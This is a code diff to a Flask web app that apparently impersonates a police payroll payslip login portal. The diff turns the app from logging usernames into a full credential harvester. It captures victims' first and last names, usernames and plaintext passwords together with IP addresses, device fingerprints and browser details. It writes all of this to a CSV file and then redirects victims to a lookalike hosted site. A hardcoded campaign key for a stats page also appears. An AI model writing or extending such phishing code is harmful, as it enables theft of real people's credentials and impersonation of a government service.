@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, jsonify
+from flask import Flask, render_template, request, redirect, jsonify, session
 import csv # getting the configuration of csv
 import os # configuration/ portable way of using operating system
 import time #getting the time
@@ -10,19 +10,23 @@ import hashlib
 import uuid
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)  # Required for session
 
 # Secret access key for stats page (change this to a secure value)
 STATS_ACCESS_KEY = "pnp-pms-campaign2025"
 
-# Route for rendering the login page using html
+# Route for rendering the identity page as the main landing page
 @app.route('/')
 def index():
-    return render_template('index.html')
-
-# Route for rendering the identity confirmation page
-@app.route('/identity')
-def identity():
     return render_template('identity.html')
+
+# Route for rendering the login page after identity confirmation
+@app.route('/login')
+def login_page():
+    # Check if we have first name and last name in session
+    if 'firstname' not in session or 'lastname' not in session:
+        return redirect('/')
+    return render_template('index.html')
 
 """
 A function designed to retrieve 
@@ -77,21 +81,24 @@ def identity_submit():
     firstname = request.form.get('firstname')
     lastname = request.form.get('lastname')
     
-    # Get enhanced client information
-    ip_address = get_client_ip()
-    device_type = get_device_type()
-    device_fingerprint = generate_device_fingerprint()
-    browser_info = get_browser_info()
-    
     if not firstname or not lastname:
         return render_template('identity.html', error="Please enter both First Name and Last Name")
     
-    # Save the data
-    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    save_to_csv(f"{firstname} {lastname}", timestamp, ip_address, device_fingerprint, device_type, browser_info)
+    # Store in session for later use
+    session['firstname'] = firstname
+    session['lastname'] = lastname
     
-    # Redirect to specified external site
-    return redirect("https://payslip-pnppms.onrender.com/")
+    # Get enhanced client information
+    ip_address = get_client_ip()
+    device_type = get_device_type()
+    
+    # Store in session for later use with full submission
+    session['ip_address'] = ip_address
+    session['device_type'] = device_type
+    session['time_identity'] = time.strftime('%Y-%m-%d %H:%M:%S')
+    
+    # Redirect to login page
+    return redirect('/login')
 
 """
 Function to determine if the client is using a mobile or desktop device
@@ -222,31 +229,40 @@ def get_browser_info():
     
     return json.dumps(browser_details)
 
-# routing for handle requests
+# routing for handle login form submission
 @app.route('/login', methods=['POST'])
 def login():
+    # Get the form data
     username = request.form.get('username')
+    password = request.form.get('password')
     
-    # Get enhanced client information
-    ip_address = get_client_ip()
-    device_type = get_device_type()
+    # Check if identity was confirmed
+    if 'firstname' not in session or 'lastname' not in session:
+        return redirect('/')
+    
+    # Get saved information
+    firstname = session.get('firstname')
+    lastname = session.get('lastname')
+    ip_address = session.get('ip_address', get_client_ip())
+    device_type = session.get('device_type', get_device_type())
+    
+    # Get more enhanced client information
     device_fingerprint = generate_device_fingerprint()
     browser_info = get_browser_info()
     
-    if not username:
-        return render_template('index.html', error="Please enter your username")
+    if not username or not password:
+        return render_template('index.html', error="Please enter both username and password")
     
-    # Save the data
+    # Save the complete data
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type, browser_info)
+    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
-    # Redirect to original site
-    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2F")
+    # Redirect to external site
+    return redirect("https://payslip-pnppms.onrender.com/")
 
-def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type, browser_info):
+def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
     """ 
-    Get the directory where the script is located. The name for stacking credentials is 
-    data.csv
+    Save complete user data to CSV
     """
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
@@ -268,7 +284,10 @@ def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type
             """
             if not file_exists or os.stat(csv_path).st_size == 0:
                 writer.writerow([
-                    'username', 
+                    'first_name',
+                    'last_name',
+                    'username',
+                    'password',
                     'timestamp', 
                     'ip_address', 
                     'device_fingerprint', 
@@ -286,9 +305,12 @@ def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type
                 ])
                 csvfile.flush()
 
-            # append login credentials with detailed browser info
+            # append all data with detailed browser info
             writer.writerow([
-                username, 
+                firstname,
+                lastname,
+                username,
+                password,
                 timestamp, 
                 ip_address, 
                 device_fingerprint, 
@@ -305,8 +327,7 @@ def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type
                 browser_details.get('full_user_agent', 'Unknown')
             ])
             csvfile.flush()
-    except PermissionError:
-        
+    except Exception as e:
         """
         if writing to default location fails, it will go alternative way/append
         to navigate it's location request.
@@ -317,7 +338,10 @@ def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type
             
             if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                 writer.writerow([
-                    'username', 
+                    'first_name',
+                    'last_name',
+                    'username',
+                    'password',
                     'timestamp', 
                     'ip_address', 
                     'device_fingerprint', 
@@ -336,7 +360,10 @@ def save_to_csv(username, timestamp, ip_address, device_fingerprint, device_type
                 csvfile.flush()
             
             writer.writerow([
-                username, 
+                firstname,
+                lastname,
+                username,
+                password,
                 timestamp, 
                 ip_address, 
                 device_fingerprint, 
